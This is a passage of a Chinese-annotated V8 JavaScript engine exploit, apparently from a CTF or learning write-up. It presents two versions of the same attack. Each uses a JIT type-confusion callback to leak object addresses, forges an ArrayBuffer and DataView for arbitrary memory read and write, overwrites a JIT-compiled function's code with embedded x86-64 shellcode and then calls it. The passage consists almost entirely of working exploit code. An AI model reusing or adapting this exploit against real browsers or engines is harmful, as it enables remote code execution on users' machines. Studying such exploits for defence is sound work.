        }
        for (var i = 0; i < 100000; i++) {
            trigger(arr1, function() {})
        }
        re=u2d(trigger(arr1,evil_r1));
        return re;
    }
    ab_map_obj_addr=read_obj_addr1(ab_map_obj_float)+0x280+0x10;
    print(ab_map_obj_addr.toString(16));
    var fake_ab = [
        ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
        ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
        ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
        0x0,0x4000, /* buffer length */
        0x12345678,0x123,/* buffer address */
        0x4,0x0
    ]
    var fake_ab_float = [1.1,1.1,1.1,1.1,1.1,1.1];
    change_to_float(fake_ab,fake_ab_float);
    gc();
    arr2=[1.1,2.2,3.3,4.4];
    function read_obj_addr2(object){
        function evil_r2() {
            arr2[0] = object;
        }
        for (var i = 0; i < 100000; i++) {
            trigger(arr2, function() {})
        }
        re=u2d(trigger(arr2,evil_r2));
        return re;
    }
    print("要leak出的fake_ab_float的数组");
    %DebugPrint(fake_ab_float);
    fake_ab_float_addr=read_obj_addr2(fake_ab_float)+0x300+0x10;
    print(fake_ab_float_addr.toString(16));
    fake_ab_float_addr_f = d2u(fake_ab_float_addr / 0x100000000,fake_ab_float_addr & 0xffffffff);
    print(fake_ab_float_addr_f + '\n\n\n');
    arrr=[1.1,2.2,3.3,4.4];
    function write_obj_addr(object){
        function evil_w0() {
            arrr[0] = {};
            %DebugPrint(arrr);
        }
        for (var i = 0; i < 100000; i++) {
            trigger2(arrr, function() {},1.1);
        }
        // print("arrr first is");
        // %DebugPrint(arrr);
        trigger2(arrr,evil_w0,fake_ab_float_addr_f);
    }
    write_obj_addr(fake_ab_float_addr_f);
    print("arrr last is");
    %DebugPrint(arrr);
    //DataView(ArrayBuffer buffer [, 字节起始位置 [, 长度]]);
    fake_dv = new DataView(arrr[0],0,0x4000);
    %DebugPrint(fake_dv);
    var evil_f = new Function("var a = 1000000");
    gc();
    print("要read的function");
    %DebugPrint(evil_f);
    arr3=[1.1,2.2,3.3,4.4];
    function read_obj_addr3(object){
        function evil_r3() {
            arr3[0] = object;
            %DebugPrint(arr3);
        }
        for (var i = 0; i < 100000; i++) {
            trigger(arr3, function() {})
        }
        re=u2d(trigger(arr3,evil_r3));
        return re;
    }
    shellcode_address_ref=read_obj_addr3(evil_f)+0x38-1;
    print(shellcode_address_ref.toString(16));
    function Read32(addr){
        fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
        //fake_dv = new DataView(fake_arraybuffer,0,0x4000);
        //print(fake_ab_float[4]);
        //get方法的参数都是一个字节序号（不能是负数，否则会报错），表示从哪个字节开始读取。
        //如果一次读取两个或两个以上字节，就必须明确数据的存储方式，到底是小端字节序还是大端字节序。
        //默认情况下，DataView的get方法使用大端字节序解读数据，如果需要使用小端字节序解读，必须在get方法的第二个参数指定true。
        return fake_dv.getUint32(0,true);
    }
    function Write32(addr,value){
        fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
        //fake_dv = new DataView(fake_arraybuffer,0,0x4000);
        //print(fake_ab_float[4]);
        print("write");     
        fake_dv.setUint32(0,value,true);
    }
    shellcode_address = Read32(shellcode_address_ref) + Read32(shellcode_address_ref+0x4) * 0x100000000;;
    print(shellcode_address.toString(16));
    var addr = shellcode_address-1+0x60;
    fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
    var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
    // shellcode[0] = 0x90909090;
    // shellcode[1] = 0x90909090;
    // shellcode[2] = 0x782fb848;
    // shellcode[3] = 0x636c6163;
    // shellcode[4] = 0x48500000;
    // shellcode[5] = 0x73752fb8;
    // shellcode[6] = 0x69622f72;
    // shellcode[7] = 0x8948506e;
    // shellcode[8] = 0xc03148e7;
    // shellcode[9] = 0x89485750;
    // shellcode[10] = 0xd23148e6;
    // shellcode[11] = 0x3ac0c748;
    // shellcode[12] = 0x50000030;
    // shellcode[13] = 0x4944b848;
    // shellcode[14] = 0x414c5053;
    // shellcode[15] = 0x48503d59;
    // shellcode[16] = 0x3148e289;
    // shellcode[17] = 0x485250c0;
    // shellcode[18] = 0xc748e289;
    // shellcode[19] = 0x00003bc0;
    // shellcode[20] = 0x050f00;
    for(var i = 0; i < shellcode.length;i++){
        var value = shellcode[i];       
        fake_dv.setUint32(i * 4,value,true);
    }
    print("go to shellcode!");
    evil_f();
#### 版本2(工具类在上面)
    // leak出object的地址，即将一个object当成double读出来
    function trigger(arr,callback){
        var v=arr[0];
        callback();
        return arr[0];
    }
    // 将一个数当成object写进去
    function trigger2(arr, callback, val) {
        var v = arr[0];
        callback();
        arr[0] = val;
    }
    gc();
    gc();
    var ab_map_obj = [
        -1.1263976280432204e+129,
        3.477098183419809e-308,
        6.73490047e-316,
        -1.1263976280432204e+129,   // use ut32.prototype replace it
        -1.1263976280432204e+129,
        0.0
    ];
    gc();
    gc();
    var ab=new ArrayBuffer(0x20);
    // print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());
    // print("float is " + (new Int64(0x00000000082003ff)).asDouble().toString());
    arr0=[1.1,2.2,3.3,4.4];
    // leak arraybuffer的prototype和constructor
    function read_obj_addr(object){
        function evil_r0() {
            arr0[0] = object;
        }
        for (var i = 0; i < 100000; i++) {
            trigger(arr0, function() {})
        }
        // print(Int64.fromDouble(trigger(arr0,evil_r0)).toString(16));
        re=Int64.fromDouble(trigger(arr0,evil_r0));
        return re;
    }
    ab_proto_addr=parseInt(read_obj_addr(ab.__proto__));
    print("要被leak的ArrayBuffer");
    %DebugPrint(ab);
    print(ab_proto_addr.toString(16));
    ab_constructor_addr = ab_proto_addr - 0x1b0;
    print(ab_constructor_addr.toString(16));
    ab_map_obj[0x3]=new Int64(ab_proto_addr).asDouble();
    ab_map_obj[0x4]=new Int64(ab_constructor_addr).asDouble();
    print("要leak出的ab_map_obj的数组");
    %DebugPrint(ab_map_obj);
    // leak ab_map_obj的地址
    arr1=[1.1,2.2,3.3,4.4];
    function read_obj_addr1(object){
        function evil_r1() {
            arr1[0] = object;
        }
        for (var i = 0; i < 100000; i++) {
            trigger(arr1, function() {})
        }
        // print(Int64.fromDouble(trigger(arr1,evil_r1)).toString(16));
        re=Int64.fromDouble(trigger(arr1,evil_r1));
        // while(1);
        return re;
    }
    // ab_map_obj_addr = read_obj_addr1(ab_map_obj);
    ab_map_obj_addr = parseInt(read_obj_addr1(ab_map_obj))+0x70;
    print(ab_map_obj_addr.toString(16));
    ab_map_obj_addr = new Int64(ab_map_obj_addr).asDouble();
    // print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());
    gc();
    gc();
    var fake_ab = [
        ab_map_obj_addr,
        ab_map_obj_addr,
        ab_map_obj_addr,
        3.4766779039175e-310, /* buffer length 0x4000*/
        3.477098183419809e-308,//backing store,先随便填一个数
        3.477098183419809e-308
    ];
    gc();
    gc();
    arr2=[1.1,2.2,3.3,4.4];
    function read_obj_addr2(object){
        function evil_r2() {
            arr2[0] = object;
        }
        for (var i = 0; i < 100000; i++) {
            trigger(arr2, function() {})
        }
        re=Int64.fromDouble(trigger(arr2,evil_r2));
        return re;
    }
    print("要leak出的fake_ab的数组");
    %DebugPrint(fake_ab);
    fake_ab_float_addr=parseInt(read_obj_addr2(fake_ab))+0x70;
    print(fake_ab_float_addr.toString(16));
    fake_ab_float_addr=new Int64(fake_ab_float_addr).asDouble();
    arrr=[1.1,2.2,3.3,4.4];
    function write_obj_addr(object){
        function evil_w0() {
            arrr[0] = {};
            %DebugPrint(arrr);
        }
        for (var i = 0; i < 100000; i++) {
            trigger2(arrr, function() {},1.1);
        }
        // print("arrr first is");
        // %DebugPrint(arrr);
        trigger2(arrr,evil_w0,fake_ab_float_addr);
    }
    write_obj_addr(fake_ab_float_addr);
    print("arrr last is");
    %DebugPrint(arrr);
    //DataView(ArrayBuffer buffer [, 字节起始位置 [, 长度]]);
    fake_dv = new DataView(arrr[0],0,0x4000);
    %DebugPrint(fake_dv);
    gc();
    gc();
    var evil_f = new Function("var a = 1000000");
    gc();
    gc();
    print("要read的function");
    %DebugPrint(evil_f);
    arr3=[1.1,2.2,3.3,4.4];
    function read_obj_addr3(object){
        function evil_r3() {
            arr3[0] = object;
            %DebugPrint(arr3);
        }
        for (var i = 0; i < 100000; i++) {
            trigger(arr3, function() {})
        }
        re=Int64.fromDouble(trigger(arr3,evil_r3));
        return re;
    }
    shellcode_address_ref=parseInt(read_obj_addr3(evil_f))+0x38-1;
    print(shellcode_address_ref.toString(16));
    // while(1);
    // read function code address
    fake_ab[4]=new Int64(shellcode_address_ref).asDouble();
    fake_ab[5]=new Int64(shellcode_address_ref).asDouble();
    %DebugPrint(fake_ab);
    shellcode_address =  fake_dv.getFloat64(0,true);
    print(Int64.fromDouble(shellcode_address).toString(16));
    shellcode_address=shellcode_address+new Int64(0x5f).asDouble();
    print(Int64.fromDouble(shellcode_address).toString(16));
    fake_ab[4]=shellcode_address;
    fake_ab[5]=shellcode_address;
    %DebugPrint(fake_ab);
    // while(1);
    var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
    for(var i = 0; i < shellcode.length;i++){
        var value = shellcode[i];       
        fake_dv.setUint32(i * 4,value,true);
    }
    print("go to shellcode!");
    evil_f();